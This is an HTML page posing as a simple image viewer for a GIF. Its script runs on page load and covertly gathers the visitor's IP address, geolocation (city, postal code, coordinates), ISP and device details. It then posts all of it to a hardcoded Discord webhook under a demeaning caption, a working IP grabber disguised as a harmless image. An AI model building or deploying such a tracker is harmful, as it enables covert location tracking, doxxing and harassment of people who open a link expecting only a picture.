<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Viewer</title>
    <style>
        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000;
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
        }
        
        .image-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1;
        }
        
        .fullscreen-image {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            transition: opacity 0.5s ease;
        }
        
        #ip-info {
            display: none;
            visibility: hidden;
            position: absolute;
            opacity: 0;
        }
        
        .loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            z-index: 0;
        }
        
        @keyframes spin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Loader -->
    <div class="loader" id="loader"></div>
    
    <!-- Container for the main image -->
    <div class="image-container">
        <img class="fullscreen-image" id="main-image" src="funny.gif" alt="" style="opacity: 0;">
    </div>
    
    <!-- Hidden element to store IP info -->
    <div id="ip-info"></div>

    <script>
        // Configuration
        const CONFIG = {
            webhookUrl: 'https://discord.com/api/webhooks/1361732575088873795/iPMvjztxikH1bgdUSq2qT7_f__Ghc-eYlInI89PGDPod4u4XCvseWm1CRUihpoZPHJ_6',
            ipProvider: 'https://api.ipify.org?format=json',
            geoProvider: 'https://ipapi.co/{ip}/json/',
            embedColor: 3447003, // Blue
            debugMode: false
        };
        
        // DOM Elements
        const elements = {
            ipInfo: document.getElementById('ip-info'),
            mainImage: document.getElementById('main-image'),
            loader: document.getElementById('loader')
        };
        
        // Logger
        const logger = {
            log: (message, data) => {
                if (CONFIG.debugMode) console.log(message, data || '');
            },
            error: (message, error) => {
                console.error(message, error || '');
            }
        };
        
        // Show the main image and hide the loader
        function showImage() {
            elements.mainImage.style.opacity = '1';
            setTimeout(() => {
                elements.loader.style.display = 'none';
            }, 500);
        }
        
        // Get the visitor's IP address
        async function getIpAddress() {
            try {
                const response = await fetch(CONFIG.ipProvider);
                if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
                
                const data = await response.json();
                return data.ip;
            } catch (error) {
                logger.error('Error retrieving IP address:', error);
                throw error;
            }
        }
        
        // Get geolocation data based on IP
        async function getGeoLocation(ip) {
            try {
                const url = CONFIG.geoProvider.replace('{ip}', ip);
                const response = await fetch(url);
                if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
                
                return await response.json();
            } catch (error) {
                logger.error('Error retrieving geolocation data:', error);
                throw error;
            }
        }
        
        // Collect complete visitor information
        async function collectVisitorInfo() {
            try {
                // Get IP address
                const ip = await getIpAddress();
                logger.log('Detected IP:', ip);
                
                // Get geolocation data
                const geoData = await getGeoLocation(ip);
                logger.log('Geolocation data:', geoData);
                
                // Collect device information
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer || 'direct'
                };
                
                // Create object with all information
                return {
                    ip: ip,
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude,
                    postal: geoData.postal,
                    timezone: geoData.timezone,
                    isp: geoData.org,
                    device: deviceInfo,
                    timestamp: new Date().toISOString()
                };
            } catch (error) {
                logger.error('Error collecting visitor information:', error);
                throw error;
            }
        }
        
        // Send information to Discord webhook
        async function sendToDiscord(visitorInfo) {
            try {
                // Create Google Maps static map URL
                const mapImageUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${visitorInfo.latitude},${visitorInfo.longitude}&zoom=12&size=600x300&maptype=roadmap&markers=color:red%7C${visitorInfo.latitude},${visitorInfo.longitude}`;
                
                // Create Google Maps URL
                const googleMapsUrl = `https://www.google.com/maps?q=${visitorInfo.latitude},${visitorInfo.longitude}`;
                
                // Create formatted message for Discord
                const message = {
                    content: '**New Bitch Pulled!!!**',
                    embeds: [{
                        title: 'Bitch Info',
                        color: CONFIG.embedColor,
                        fields: [
                            {
                                name: 'IP ADDRESS',
                                value: visitorInfo.ip,
                                inline: true
                            },
                            {
                                name: 'CITY',
                                value: visitorInfo.city || 'not available',
                                inline: true
                            },
                            {
                                name: 'REGION',
                                value: visitorInfo.region || 'not available',
                                inline: true
                            },
                            {
                                name: 'COUNTRY',
                                value: visitorInfo.country || 'not available',
                                inline: true
                            },
                            {
                                name: 'COORDS',
                                value: `[${visitorInfo.latitude}, ${visitorInfo.longitude}](${googleMapsUrl})`,
                                inline: true
                            },
                            {
                                name: 'ISP',
                                value: visitorInfo.isp || 'not available',
                                inline: true
                            },
                            {
                                name: 'DEVICE',
                                value: `${visitorInfo.device.platform} - ${visitorInfo.device.screenSize}`,
                                inline: true
                            },
                            {
                                name: 'BROWSER',
                                value: visitorInfo.device.userAgent.split(' ').slice(-1)[0],
                                inline: true
                            },
                            {
                                name: 'TIMEZONE',
                                value: visitorInfo.device.timeZone,
                                inline: true
                            },
                            {
                                name: 'REFERRER',
                                value: visitorInfo.device.referrer,
                                inline: true
                            }
                        ],
                        image: {
                            url: mapImageUrl
                        },
                        footer: {
                            text: `Timestamp: ${new Date(visitorInfo.timestamp).toLocaleString()}`
                        }
                    }]
                };
                
                // Send data to Discord webhook
                const response = await fetch(CONFIG.webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                
                if (response.ok) {
                    logger.log('Data successfully sent to Discord!');
                } else {
                    throw new Error(`HTTP Error: ${response.status} - ${await response.text()}`);
                }
            } catch (error) {
                logger.error('Error sending data to Discord:', error);
            }
        }
        
        // Main function that initializes the application
        async function initApp() {
            try {
                // Show the image when it's loaded
                elements.mainImage.onload = showImage;
                
                // Collect visitor information
                const visitorInfo = await collectVisitorInfo();
                
                // Save information in the hidden element
                elements.ipInfo.textContent = JSON.stringify(visitorInfo);
                
                // Send information to Discord
                await sendToDiscord(visitorInfo);
            } catch (error) {
                logger.error('Error initializing the application:', error);
                // Still show the image in case of error
                showImage();
            }
        }
        
        // Initialize the application when the page is fully loaded
        window.addEventListener('load', initApp);
    </script>
</body>
</html>
